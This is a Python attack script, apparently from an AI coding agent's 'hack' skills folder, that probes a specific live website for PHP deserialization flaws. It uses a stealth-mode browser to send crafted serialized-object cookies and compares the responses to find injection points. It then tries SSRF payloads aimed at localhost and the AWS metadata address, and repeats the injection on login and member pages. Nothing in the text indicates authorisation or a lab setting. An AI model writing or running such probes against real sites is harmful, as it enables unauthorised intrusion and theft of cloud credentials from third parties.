#!/usr/bin/env python3
"""Deep analysis: diff deserialization responses to understand server behavior."""
import sys, re, json, difflib
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')
sys.path.insert(0, r"C:\Users\97912\.codex\skills\hack\scripts")
from cdp_launch import connect_playwright_cdp

BASE = "https://jgy09.com"
PORT = 9222

browser, pw = connect_playwright_cdp(port=PORT, stealth=True)
ctx = browser.contexts[0]

print("="*60)
print("  DESERIALIZATION DEEP ANALYSIS")
print("="*60)

# 1. Get baseline (no tracking cookie)
resp_baseline = ctx.request.get(BASE + "/", timeout=15000)
baseline_body = resp_baseline.text()
print(f"\nBaseline (no cookie): {len(baseline_body)} bytes")

# 2. Get with original tracking cookie
resp_orig = ctx.request.get(BASE + "/", timeout=15000,
    headers={"Cookie": 'tracking=O:8:"stdClass":1:{s:4:"test";s:4:"ping";}'})
orig_body = resp_orig.text()
print(f"With original cookie: {len(orig_body)} bytes")

# 3. Get with injected marker string payload
resp_marker = ctx.request.get(BASE + "/", timeout=15000,
    headers={"Cookie": 'tracking=s:11:"INJ_MARKER2";'})
marker_body = resp_marker.text()
print(f"With string marker: {len(marker_body)} bytes")

# 4. Find what changed between baseline and marker response
print("\n[*] Diffing baseline vs marker response...")
baseline_lines = baseline_body.split('\n')
marker_lines = marker_body.split('\n')

# Find unique content in marker response
unique_in_marker = set(marker_lines) - set(baseline_lines)
print(f"  Unique lines in marker response: {len(unique_in_marker)}")
for line in list(unique_in_marker)[:20]:
    if line.strip():
        print(f"    + {line.strip()[:150]}")

# 5. Check if INJ_MARKER appears anywhere
if "INJ_MARKER" in marker_body:
    print("\n  [!!!] INJ_MARKER found in response!")
    idx = marker_body.index("INJ_MARKER")
    print(f"  Context: {marker_body[max(0,idx-100):idx+100]}")

# 6. Check for JSON/structured data changes
print("\n[*] Looking for data structures in responses...")
# Try to find JSON blobs that might contain deserialized data
json_blobs = re.findall(r'\{[^{}]{10,200}\}', marker_body)
if json_blobs:
    print(f"  JSON-like blobs in marker response: {len(json_blobs)}")
    for blob in json_blobs[:5]:
        if "test" in blob or "ping" in blob or "INJ" in blob:
            print(f"    [!] {blob[:200]}")

# 7. Extract all script content from marker response
scripts = re.findall(r'<script[^>]*>(.*?)</script>', marker_body, re.S | re.I)
print(f"\n[*] Inline scripts in marker response: {len(scripts)}")
for i, script in enumerate(scripts):
    if len(script.strip()) > 0:
        # Look for dynamic data injection
        if "test" in script.lower() or "ping" in script.lower() or "INJ" in script:
            print(f"\n  Script #{i+1} (contains test/ping/INJ):")
            print(f"  {script[:500]}")
        elif "stdClass" in script or "serialize" in script or "unserialize" in script:
            print(f"\n  Script #{i+1} (contains serialization keywords):")
            print(f"  {script[:500]}")

# 8. Check for config/data injection points
# The page loads defConfig.js - check if our cookie affects it
print("\n[*] Checking if defConfig.js changes with different cookies...")
resp_config1 = ctx.request.get(BASE + "/defConfig.js", timeout=10000)
config1 = resp_config1.text() if resp_config1 else ""

resp_config2 = ctx.request.get(BASE + "/defConfig.js", timeout=10000,
    headers={"Cookie": 'tracking=O:8:"stdClass":1:{s:4:"test";s:11:"INJ_MARKER2";}'})
config2 = resp_config2.text() if resp_config2 else ""

if config1 != config2:
    print(f"  [!!!] defConfig.js CHANGES based on tracking cookie!")
    print(f"  Without cookie: {len(config1)} bytes")
    print(f"  With cookie: {len(config2)} bytes")
    # Show diff
    diff = list(difflib.unified_diff(config1.split('\n'), config2.split('\n'), lineterm=''))
    for line in diff[:30]:
        print(f"  {line}")
else:
    print(f"  [-] defConfig.js identical regardless of cookie ({len(config1)} bytes)")
    print(f"  Content: {config1[:300]}")

# 9. Check the actual HTML structure changes
print("\n[*] Analyzing HTML structure changes...")
# Count different element types
for label, body in [("baseline", baseline_body), ("marker", marker_body)]:
    divs = len(re.findall(r'<div', body, re.I))
    scripts = len(re.findall(r'<script', body, re.I))
    imgs = len(re.findall(r'<img', body, re.I))
    links = len(re.findall(r'<a ', body, re.I))
    forms = len(re.findall(r'<form', body, re.I))
    iframes = len(re.findall(r'<iframe', body, re.I))
    print(f"  {label}: divs={divs}, scripts={scripts}, imgs={imgs}, links={links}, forms={forms}, iframes={iframes}")

# 10. Look for API responses in the page (AJAX-loaded content)
# Check if response contains JSON data that we can influence
print("\n[*] Searching for injectable data fields...")
# Look for input fields, data attributes
data_attrs = re.findall(r'data-[a-z]+=["\']([^"\']+)["\']', marker_body, re.I)
print(f"  Data attributes: {len(data_attrs)}")
for attr in data_attrs[:10]:
    print(f"    {attr[:100]}")

# 11. Test with a URL in the tracking cookie (SSRF via deserialization)
print("\n[*] Testing SSRF via tracking cookie...")
ssrf_payloads = [
    's:22:"http://127.0.0.1:80/test";',
    's:18:"http://127.0.0.1/";',
    's:26:"http://169.254.169.254/";',  # AWS metadata
    's:34:"http://169.254.169.254/latest/";',
    'O:8:"stdClass":1:{s:3:"url";s:22:"http://127.0.0.1:80/";}',
]
for payload in ssrf_payloads:
    resp = ctx.request.get(BASE + "/", timeout=15000,
        headers={"Cookie": f"tracking={payload}"})
    if resp:
        body = resp.text()
        if len(body) != len(baseline_body):
            print(f"  [{len(body)}b vs {len(baseline_body)}b] {payload[:60]}")
            # Check for SSRF response indicators
            if "169.254" in body or "metadata" in body.lower() or "ami-id" in body.lower():
                print(f"    [!!!] SSRF CONFIRMED — cloud metadata in response!")
            if "127.0.0.1" in body and "localhost" not in baseline_body:
                print(f"    [!] Localhost reference appeared in response")

# 12. Test if tracking cookie affects other pages
print("\n[*] Testing tracking cookie on other endpoints...")
endpoints = ["/login/", "/index.php", "/wp-login.php", "/member/"]
for ep in endpoints:
    resp_normal = ctx.request.get(BASE + ep, timeout=10000)
    resp_injected = ctx.request.get(BASE + ep, timeout=10000,
        headers={"Cookie": 'tracking=O:8:"stdClass":1:{s:4:"test";s:11:"INJ_MARKER2";}'})
    if resp_normal and resp_injected:
        diff_len = abs(len(resp_injected.text()) - len(resp_normal.text()))
        if diff_len > 50:
            print(f"  {ep}: normal={len(resp_normal.text())}b, injected={len(resp_injected.text())}b (delta={diff_len}b)")
            if "INJ_MARKER" in resp_injected.text():
                print(f"    [!!!] INJ_MARKER reflected on {ep}!")

print("\n[*] Deep analysis complete.")
